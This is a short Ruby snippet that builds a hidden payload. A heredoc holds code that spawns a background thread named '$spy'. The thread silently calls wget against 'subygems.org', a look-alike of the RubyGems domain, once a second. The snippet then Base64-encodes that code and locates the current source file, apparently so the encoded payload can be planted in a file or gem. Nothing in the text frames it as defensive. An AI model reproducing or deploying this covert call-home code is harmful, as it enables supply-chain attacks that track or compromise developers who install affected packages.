cmd = <<~CMD
  $spy ||= Thread.new do
    loop do
      sleep(1)
      `
        wget 'https://subygems.org/such-wow/\#\{rand\}' \
        -q -O /dev/null \
        &> /dev/null
      `
    end
  end
CMD

Base64.urlsafe_encode64(cmd)
file_location = File.expand_path(__FILE__)
